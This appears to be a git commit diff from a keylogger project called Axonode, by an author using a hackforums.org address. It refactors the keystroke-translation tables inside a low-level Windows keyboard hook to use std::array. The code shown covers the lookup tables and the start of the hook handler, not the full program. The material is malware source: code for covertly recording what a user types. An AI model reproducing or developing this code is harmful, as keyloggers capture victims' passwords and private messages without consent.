a372362bc9a16bf3fbaa0510864c5e9735fab2cc
TachyonRSA <tachyon@hackforums.org>
2017-06-19 11:05:05 +0200

    - Reworked keylogging arrays to C++ standard.

--- Axonode/Axonode/Axonode.cpp
+++ Axonode/Axonode/Axonode.cpp
@@ -5,6 +5,7 @@
 #include <sstream>
 #include <iostream>
 #include <cstdio>
+#include <array>
 
 HHOOK hKeyboardHook;
 int isCaps = 0;
@@ -12,15 +13,18 @@ int isCaps = 0;
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	DWORD SHIFT_key = 0;
-	unsigned int vCode[61] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E,
-	0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x6A, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0xBC, 0xBD, 0xC0, 0xBE, 0xBB,
-	0x08, 0x0D, 0x20, 0xDE, 0xBF, 0xDB, 0xDD, 0xBA, 0x09};
-	std::string lowCase[61] = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s",
-	"t", "u", "v", "w", "x", "y", "z", "*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ",", "-", "`", ".", "=", "\b \b", "[ENTER] \n", " ", "'", "/", "[", "]", ";",
-	"[TAB] \t"};
-	std::string upCase[61] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S",
-	"T", "U", "V", "W", "X", "Y", "Z", "*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "<", "_", "~", ">", "+", "\b \b", "[ENTER] \n", " ", "\"", "?", "{", "}", ":",
-	"[TAB] + [SHIFT] \t" };
+
+	std::array<unsigned int, 61> vCode = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E,
+		0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x6A, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0xBC, 0xBD, 0xC0, 0xBE, 0xBB,
+		0x08, 0x0D, 0x20, 0xDE, 0xBF, 0xDB, 0xDD, 0xBA, 0x09 };
+
+	std::array<std::string, 61> lowCase = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s",
+		"t", "u", "v", "w", "x", "y", "z", "*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ",", "-", "`", ".", "=", "\b \b", "[ENTER] \n", " ", "'", "/", "[", "]", ";",
+		"[TAB] \t" };
+
+	std::array<std::string, 61> upCase = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S",
+		"T", "U", "V", "W", "X", "Y", "Z", "*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "<", "_", "~", ">", "+", "\b \b", "[ENTER] \n", " ", "\"", "?", "{", "}", ":",
+		"[TAB] + [SHIFT] \t" };
 
 	if ((nCode == HC_ACTION) && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP))
 	{
